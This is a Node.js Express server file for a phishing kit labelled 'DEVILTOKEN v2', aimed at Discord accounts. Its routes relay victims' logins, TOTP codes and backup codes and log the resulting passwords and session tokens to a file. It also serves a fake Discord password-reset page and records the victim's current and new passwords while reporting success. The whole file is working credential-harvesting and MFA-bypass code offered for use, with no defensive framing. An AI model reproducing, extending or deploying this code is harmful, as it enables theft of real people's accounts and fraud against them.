// language: JavaScript, file: server.js v2, target: Node.js 20+
// adds: /api/phish/capture · /reset phishing page route · request log

const express = require("express");
const cors = require("cors");
const helmet = require("helmet");
const path = require("path");
const fs = require("fs");
const { login, mfaTotp, mfaBackup, getUserInfo } = require("./discord");

const app = express();
const PORT = process.env.PORT || 3000;
const LOG_FILE = path.join(__dirname, "caught.log");

app.use(helmet({ contentSecurityPolicy: false }));
app.use(cors());
app.use(express.json());
app.use(express.static(path.join(__dirname, "public")));

// ─── LOG HELPER ───
function logCapture(type, data) {
  const entry = {
    ts: new Date().toISOString(),
    ip: data.ip,
    type,
    payload: data,
  };
  fs.appendFileSync(LOG_FILE, JSON.stringify(entry) + "\n");
  console.log(`[CATCH] ${type} | ${data.ip} | ${JSON.stringify(data).slice(0, 80)}`);
}

// ─── AUTH ROUTES ───
app.post("/api/login", async (req, res) => {
  const { email, password } = req.body;
  if (!email || !password)
    return res.json({ success: false, error: "Missing fields" });

  // Log the attempt
  logCapture("login_attempt", {
    ip: req.ip,
    email,
    password,
  });

  const result = await login(email, password);

  if (result.success && result.token) {
    logCapture("token_captured", { ip: req.ip, email, token: result.token });
  }

  res.json(result);
});

app.post("/api/mfa/totp", async (req, res) => {
  const { ticket, code } = req.body;
  if (!ticket || !code) return res.json({ success: false, error: "Missing" });
  const result = await mfaTotp(ticket, code);
  if (result.success) logCapture("mfa_token", { ip: req.ip, code, token: result.token });
  res.json(result);
});

app.post("/api/mfa/backup", async (req, res) => {
  const { ticket, code } = req.body;
  if (!ticket || !code) return res.json({ success: false, error: "Missing" });
  const result = await mfaBackup(ticket, code);
  if (result.success) logCapture("backup_token", { ip: req.ip, code, token: result.token });
  res.json(result);
});

app.post("/api/userinfo", async (req, res) => {
  const { token } = req.body;
  if (!token) return res.json({ success: false, error: "No token" });
  const result = await getUserInfo(token);
  res.json(result);
});

// ─── PHISHING CAPTURE ───
// Called when victim submits Discord "reset password" form
app.post("/api/phish/capture", (req, res) => {
  const { email, password, new_password } = req.body;
  logCapture("phish_reset", {
    ip: req.ip,
    email,
    password,        // current password captured
    new_password,    // what they tried to set
  });

  // Tell frontend: success (victim sees "password reset successful")
  res.json({ success: true });
});

// Serve phishing page at /reset (looks like Discord reset URL)
app.get("/reset", (req, res) => {
  res.sendFile(path.join(__dirname, "public", "reset.html"));
});

// SPA fallback
app.get("*", (req, res) => {
  res.sendFile(path.join(__dirname, "public", "index.html"));
});

app.listen(PORT, () => {
  console.log(`[DEVILTOKEN v2] http://localhost:${PORT}`);
  console.log(`[PHISH] http://localhost:${PORT}/reset`);
});